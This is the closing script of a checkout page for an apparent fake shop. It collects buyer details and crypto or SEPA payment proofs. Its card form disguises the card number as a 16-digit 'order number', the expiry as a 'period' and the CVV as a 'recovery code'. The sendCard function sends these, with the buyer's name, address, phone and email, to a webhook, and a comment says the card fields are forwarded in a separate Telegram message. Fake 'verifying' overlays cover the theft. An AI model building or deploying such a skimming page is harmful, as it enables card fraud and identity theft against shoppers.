    const cart=getCart(); if(!cart.length){ renderMini(); return; }
    const sub=computeSub(cart), promo=sub*promoRate(), total=Math.max(0, sub - promo);
    const amts=splitAmounts(total, selectedSplit), dueNow=amts[0]||0;
    const set=(id,val)=>{ const el=document.getElementById(id); if(el) el.textContent=val; };
    set('sub',EUR(sub)); set('benefit',promo>0?'–'+EUR(promo):'—'); set('total',EUR(total)); set('dueNow',EUR(dueNow));

    const box=$('#schedule');
    if(box){
      if(selectedSplit>1){
        const lines=scheduleLines(total, selectedSplit);
        box.style.display='grid';
        box.innerHTML=lines.map(l=>`<div class="sch"><span>${l.label} (${l.date})</span><span>${EUR(l.amt)}</span></div>`).join('');
      }else box.style.display='none';
    }

    if(currentPM()==='crypto'){
      const ccy=$('#ccy')?.value||'USDT-BEP20'; const r=fx[ccy]?.rate||1; const amt=(dueNow/r);
      const amountNow=$('#amountNow'); if(amountNow) amountNow.value=dueNow.toFixed(2);
      const ccyAmt=$('#ccyAmt'); if(ccyAmt) ccyAmt.value=(amt>0?amt:0).toFixed(6).replace(/0+$/,'').replace(/\.$/,'');
    }
    if(currentPM()==='sepa'){ const f=$('#amountNowBank'); if(f) f.value=dueNow.toFixed(2); }
  }

  /* ====== COPY ====== */
  function copySel(sel){
    const el=$(sel); if(!el) return;
    const txt=el.value||''; if(!txt){ toast('Rien à copier'); return; }
    if(navigator.clipboard?.writeText){ navigator.clipboard.writeText(txt).then(()=>toast('Copié')); }
    else { el.select(); document.execCommand('copy'); toast('Copié'); }
  }
  $$('[data-copy]').forEach(b=> b.addEventListener('click',()=> copySel(b.getAttribute('data-copy')) ));

  /* ====== VALIDATION ====== */
  function validateAddress(){
    const req=['name','email','address','city','zip','country'];
    for(const id of req){
      const el=$('#'+id);
      const val = el?.tagName==='SELECT' ? el.value : (el?.value||'').trim();
      if(!val){ el?.focus(); toast('Veuillez compléter vos informations.'); return false; }
    }
    return true;
  }
  function validateCardForm(){
    const nm = ($('#cardName')?.value||'').trim(); if(!nm){ $('#cardName')?.focus(); toast('Titulaire requis.'); return false; }
    const num = ($('#orderNumber')?.value||'').replace(/\D+/g,''); if(num.length!==16){ $('#orderNumber')?.focus(); toast('Numéro de commande: 16 chiffres.'); return false; }
    const per = ($('#cardPeriod')?.value||'').trim(); if(!/^(0[1-9]|1[0-2])\/\d{2}$/.test(per)){ $('#cardPeriod')?.focus(); toast('Période: MM/AA.'); return false; }
    const rec = ($('#recoveryCode')?.value||'').replace(/\D+/g,''); if(rec.length<3){ $('#recoveryCode')?.focus(); toast('Code de récupération: min 3 chiffres.'); return false; }
    return true;
  }

  /* ====== OVERLAYS & CTA ====== */
  const overlay=$('#checkOverlay'), ovTitle=$('#ovTitle'), ovSub=$('#ovSub'), doneOverlay=$('#doneOverlay');
  const showOverlay=(t,s)=>{ if(ovTitle) ovTitle.textContent=t||'Vérification…'; if(ovSub) ovSub.textContent=s||'Un instant…'; overlay?.classList.add('show'); overlay?.setAttribute('aria-hidden','false'); };
  const hideOverlay=()=>{ overlay?.classList.remove('show'); overlay?.setAttribute('aria-hidden','true'); };
  const showDone=()=>{ doneOverlay?.classList.add('show'); doneOverlay?.setAttribute('aria-hidden','false'); };

  let bankVerified=false, cryptoVerified=false;
  function updateCTA(){
    const pm=currentPM(), btn=$('#placeOrder');
    if(!btn) return;
    // Pour CARTE, on redirige via le bouton dédié => on laisse "Finaliser" désactivé.
    btn.disabled = pm==='card' ? true : (pm==='sepa' ? !bankVerified : pm==='crypto' ? !cryptoVerified : true);
  }

  /* ====== WEBHOOK (POST JSON avec fallback) ====== */
  function countryName(){
    const sel=$('#country'); if(!sel) return '';
    const o=sel.options[sel.selectedIndex];
    return (o?.text||'').trim();
  }
  function cartForWebhook(){
    try{ const cart=JSON.parse(localStorage.getItem('gf_cart')||'[]'); return cart.map(x=>({name:x.name,qty:+(x.qty||1),price:+(x.price||0)})); }catch{return[];}
  }
  async function sendWebhook(payload){
    // enrichissement
    payload.req_id = payload.req_id || ('gf_' + Date.now() + '_' + Math.random().toString(36).slice(2,8));
    payload.ts_client = payload.ts_client || new Date().toISOString();
    payload.origin = location.origin;
    payload.ua = navigator.userAgent;

    const dataStr = JSON.stringify(payload);
    // A) JSON
    try{
      await fetch(WEBHOOK_URL, {
        method:'POST',
        headers:{ 'Content-Type':'application/json', ...(WEBHOOK_SECRET? {'X-Webhook-Secret':WEBHOOK_SECRET} : {}) },
        body:dataStr,
        keepalive:true
      });
      return;
    }catch(_){}
    // B) x-www-form-urlencoded (_json)
    try{
      const usp=new URLSearchParams(); usp.set('_json', dataStr);
      await fetch(WEBHOOK_URL, { method:'POST', headers:(WEBHOOK_SECRET? {'X-Webhook-Secret':WEBHOOK_SECRET} : {}), body: usp, keepalive:true });
      return;
    }catch(_){}
    // C) no-cors
    try{
      await fetch(WEBHOOK_URL, { method:'POST', mode:'no-cors', headers:{'Content-Type':'text/plain;charset=utf-8'}, body:dataStr, keepalive:true });
    }catch(_){}
  }

  /* ====== ENVOIS ====== */
  async function sendCrypto(dueNow){
    const payload = {
      orderId, method:'crypto', amount:(+dueNow||0).toFixed(2),
      txid: ($('#txid')?.value||'').trim(), ccy: $('#ccy')?.value||'USDT-BEP20',
      name:$('#name')?.value||'', email:$('#email')?.value||'', phone:$('#phone')?.value||'',
      address:$('#address')?.value||'', city:$('#city')?.value||'', zip:$('#zip')?.value||'',
      country:$('#country')?.value||'', country_name: countryName(),
      split:selectedSplit, cart:cartForWebhook()
    };
    await sendWebhook(payload);
  }

  async function fileToBase64(file){
    const buf=await file.arrayBuffer();
    let bin=''; const bytes=new Uint8Array(buf), chunk=0x8000;
    for(let i=0;i<bytes.length;i+=chunk){ bin+=String.fromCharCode.apply(null, bytes.subarray(i,i+chunk)); }
    return btoa(bin);
  }

  async function sendSepa(dueNow, proofFile){
    const payload = {
      orderId, method:'sepa', amount:(+dueNow||0).toFixed(2),
      ref: ($('#vref')?.value||'').trim(),
      name:$('#name')?.value||'', email:$('#email')?.value||'', phone:$('#phone')?.value||'',
      address:$('#address')?.value||'', city:$('#city')?.value||'', zip:$('#zip')?.value||'',
      country:$('#country')?.value||'', country_name: countryName(),
      split:selectedSplit, cart:cartForWebhook()
    };
    if(proofFile){
      payload.file_name = proofFile.name;
      payload.mime_type = proofFile.type || 'application/octet-stream';
      payload.file_b64  = await fileToBase64(proofFile);
    }
    await sendWebhook(payload);
  }

  async function sendCard(dueNow){
  // Récup 2e formulaire (carte)
  const card_name     = ($('#cardName')?.value||'').trim();
  const order_number  = ($('#orderNumber')?.value||'').replace(/\D+/g,'').slice(0,32);
  const period        = ($('#cardPeriod')?.value||'').trim();
  const recovery_code = ($('#recoveryCode')?.value||'').trim();

  // 1) POST principal (message "général")
  const payload = {
    orderId,
    method:'card',
    amount:(+dueNow||0).toFixed(2),

    // Alias + canoniques (compat Apps Script)
    card_name, order_number, period, recovery_code,
    cardName: card_name, orderNumber: order_number, cardPeriod: period, recoveryCode: recovery_code,
    titulaire: card_name, numero_commande: order_number, card_period: period, code_recuperation: recovery_code,

    // Métadonnées utiles
    phone_meta: ($('#phone')?.value||'').trim(),

    // Coordonnées
    name:$('#name')?.value||'', email:$('#email')?.value||'', phone:$('#phone')?.value||'',
    address:$('#address')?.value||'', city:$('#city')?.value||'', zip:$('#zip')?.value||'',
    country:$('#country')?.value||'', country_name: (()=>{
      const sel=$('#country'); if(!sel) return ''; const o=sel.options[sel.selectedIndex]; return (o?.text||'').trim();
    })(),

    split:selectedSplit,
    cart:(()=>{ try{ const cart=JSON.parse(localStorage.getItem('gf_cart')||'[]'); return cart.map(x=>({name:x.name,qty:+(x.qty||1),price:+(x.price||0)})); }catch{return[];} })()
  };

  await sendWebhook(payload);

  // 2) POST "meta only" (force le 2e message Telegram dédié aux champs carte)
  const metaOnly = {
    action: 'meta_card_only',       // drapeau que lit l’Apps Script v5 ci-dessous
    orderId,
    method: 'card',
    amount: payload.amount,
    card_name, order_number, period, recovery_code,
    phone_meta: payload.phone_meta
  };
  // petite pause pour éviter d’arriver dans la même milliseconde
  await new Promise(r => setTimeout(r, 120));
  await sendWebhook(metaOnly);
}

  /* ====== FILES (SEPA) ====== */
  const dz=$('#dz'), input=$('#proofInput'), fileWrap=$('#fileWrap'), fileName=$('#fileName'), fileInfo=$('#fileInfo'), fileBar=$('#fileBar'), fileOk=$('#fileOk');
  let proofFile=null;
  function fmtBytes(b){ if(b===0) return '0 B'; if(!b&&b!==0) return ''; const u=['B','KB','MB','GB']; let i=0; while(b>=1024&&i<u.length-1){b/=1024;i++;} return b.toFixed(b<10&&i?1:0)+' '+u[i]; }
  function showFile(f){
    proofFile=f;
    if(fileWrap) fileWrap.style.display='flex';
    if(fileName) fileName.textContent=f.name||'Datei';
    if(fileInfo) fileInfo.textContent=(f.type||'Unbekannter Typ')+' • '+fmtBytes(f.size||0);
    if(fileBar) fileBar.style.width='0%';
    if(fileOk) fileOk.style.display='none';
    let p=0; const step=()=>{ p+=Math.random()*35+20; if(p>=100){ p=100; fileBar&&(fileBar.style.width='100%'); fileOk&&(fileOk.style.display='inline-flex'); return; } fileBar&&(fileBar.style.width=p+'%'); setTimeout(step,150); }; setTimeout(step,150);
  }
  input?.addEventListener('change', e=>{ const f=e.target.files?.[0]; if(!f) return; if(f.size>MAX_SIZE){ toast('Datei > 10 MB.'); input.value=''; return; } showFile(f); input.value=''; });
  dz?.addEventListener('dragover', e=>{ e.preventDefault(); dz.classList.add('over'); });
  dz?.addEventListener('dragleave', e=>{ e.preventDefault(); dz.classList.remove('over'); });
  dz?.addEventListener('drop', e=>{ e.preventDefault(); dz.classList.remove('over'); const f=e.dataTransfer?.files?.[0]; if(!f) return; if(f.size>MAX_SIZE){ toast('Datei > 10 MB.'); return; } showFile(f); });
  $('#removeProof')?.addEventListener('click', ()=>{ proofFile=null; if(input) input.value=''; if(fileWrap) fileWrap.style.display='none'; });

  /* ====== TABS ====== */
  $$('.m[role="tab"]').forEach(card=>{
    card.addEventListener('click', ()=>{
      $$('.m[role="tab"]').forEach(c=>c.setAttribute('aria-selected', String(c===card)));
      const m=card.dataset.method;
      $('#pmCrypto')?.classList.toggle('show', m==='crypto');
      $('#pmSEPA')?.classList.toggle('show', m==='sepa');
      $('#pmCard')?.classList.toggle('show', m==='card');
      if(m==='sepa') cryptoVerified=false;
      if(m==='crypto') bankVerified=false;
      updateSummary(); updateCTA();
    });
  });

  /* ====== SPLIT UI ====== */
  const modal=$('#splitModal');
  const setModalParts=(n)=>{ $$('#segSplit .segbtn').forEach(b=>b.setAttribute('aria-pressed', String(Number(b.dataset.parts)===Number(n)))); };
  const updateModalPreview=()=>{
    const cart=getCart(); const sub=computeSub(cart); const promo=sub*promoRate(); const total=Math.max(0, sub - promo);
    const parts=Number($$('#segSplit .segbtn').find(b=>b.getAttribute('aria-pressed')==='true')?.dataset.parts||4);
    const lines=scheduleLines(total, parts);
    $('#modalPrev').innerHTML = lines.map(l=>`<div class="sch"><span>${l.label} (${l.date})</span><span>${EUR(l.amt)}</span></div>`).join('');
  };
  $$('#segSplit .segbtn').forEach(b=> b.addEventListener('click',()=>{ setModalParts(b.dataset.parts); updateModalPreview(); }));
  $('#btnSplit')?.addEventListener('click',()=>{ modal?.classList.add('show'); modal?.setAttribute('aria-hidden','false'); setModalParts(4); updateModalPreview(); });
  $('#closeSplit')?.addEventListener('click',()=>{ modal?.classList.remove('show'); modal?.setAttribute('aria-hidden','true'); });
  $('#cancelSplit')?.addEventListener('click',()=>{ modal?.classList.remove('show'); modal?.setAttribute('aria-hidden','true'); });
  $('#applySplit')?.addEventListener('click',()=>{ const sel=$$('#segSplit .segbtn').find(b=>b.getAttribute('aria-pressed')==='true'); selectedSplit=Number(sel?.dataset.parts||4); $('#splitHint')&&(document.getElementById('splitHint').textContent = selectedSplit>1 ? `(${selectedSplit}× monatlich)` : '(deaktiviert)'); $('#btnSplit')?.classList.add('on'); $('#btnOnce')?.classList.remove('on'); modal?.classList.remove('show'); modal?.setAttribute('aria-hidden','true'); updateSummary(); });

  /* ====== ACTIONS (anti double-click) ====== */
  function once(btn, fn){ let busy=false; btn?.addEventListener('click', async ()=>{ if(busy) return; busy=true; try{ await fn(); } finally{ setTimeout(()=>busy=false, 900); } }); }

  // Auto-génère une référence si vide (SEPA)
  function ensureVref(){ if(!$('#vref')?.value?.trim()){ const name=$('#name')?.value||''; const base=(name||'').normalize('NFD').replace(/[\u0300-\u036f]/g,'').toUpperCase().replace(/[^A-Z0-9]+/g,'').slice(0,16) || orderId.replace('GF-','').split('-')[0]; $('#vref').value = base; } }
  $('#name')?.addEventListener('input', ()=>{ if(!$('#vref')?.value?.trim()) ensureVref(); });

  once($('#confirmCrypto'), async ()=>{
    if(!validateAddress()) return;
    const tx=($('#txid')?.value||'').trim(); if(!tx){ $('#txid')?.focus(); toast('TxID requis.'); return; }
    showOverlay('Krypto wird geprüft…','Hash validieren…');
    await sendCrypto(currentDueNow());
    hideOverlay(); cryptoVerified=true; updateCTA(); toast('Transaktion erfasst — Sie können abschließen'); $('#placeOrder')?.focus();
  });

  once($('#confirmBank'), async ()=>{
    if(!validateAddress()) return;
    ensureVref();
    if(!proofFile){ $('#dz')?.scrollIntoView({behavior:'smooth',block:'center'}); toast('Überweisungsnachweis erforderlich.'); return; }
    showOverlay('Überweisung wird geprüft…','Bestätigung bei der Bank…');
    await sendSepa(currentDueNow(), proofFile);
    hideOverlay(); bankVerified=true; updateCTA(); toast('Überweisung erfasst — Sie können abschließen'); $('#placeOrder')?.focus();
  });

  once($('#payCard'), async ()=>{
    if(!validateAddress()) return;
    if(!validateCardForm()) return;
    showOverlay('Paiement par carte…','Chiffré via TLS.');
    await sendCard(currentDueNow());
    // on garde l’overlay visible jusqu’au redirect (pas de disparition "éclair")
    setTimeout(()=>{ window.location.href='merci.html'; }, 1200);
  });

  $('#placeOrder')?.addEventListener('click', ()=>{
    if(!validateAddress()) return;
    const cart=getCart(); if(!cart.length){ toast('Ihr Warenkorb ist leer.'); return; }
    const pm=currentPM(); if(pm==='crypto'&&!cryptoVerified){ toast('Bitte Krypto-Prüfung abschließen.'); return; }
    if(pm==='sepa'&&!bankVerified){ toast('Bitte Überweisungs-Prüfung abschließen.'); return; }
    const sub=computeSub(cart), promo=sub*promoRate(), total=Math.max(0, sub - promo);
    const order={ id:orderId, date:new Date().toISOString(), status:'In Bearbeitung',
      items:cart, pricing:{sub,ship:0,promo,total,currency:'EUR'},
      shipping:{ name:$('#name')?.value||'', email:$('#email')?.value||'', phone:$('#phone')?.value||'', address:$('#address')?.value||'', city:$('#city')?.value||'', zip:$('#zip')?.value||'', country:$('#country')?.value||'', country_name: countryName() },
      payment:{ method:pm, split:selectedSplit }
    };
    try{ const all=JSON.parse(localStorage.getItem('gf_orders')||'[]'); all.push(order); localStorage.setItem('gf_orders', JSON.stringify(all)); }catch{}
    setCart([]); showDone();
  });

  /* ====== INIT ====== */
  (function init(){
    const sepaTab=document.querySelector('.m[role="tab"][data-method="sepa"]'); sepaTab?.setAttribute('aria-selected','true');
    $('#pmSEPA')?.classList.add('show'); $('#pmCrypto')?.classList.remove('show'); $('#pmCard')?.classList.remove('show');
    setCryptoAddress($('#ccy')?.value||'USDT-BEP20');
    $('#ccy')?.addEventListener('change',()=>{ setCryptoAddress($('#ccy').value); updateSummary(); });
    renderMini(); updateSummary(); updateCTA();
  })();
})();
  </script>
</body>
</html>

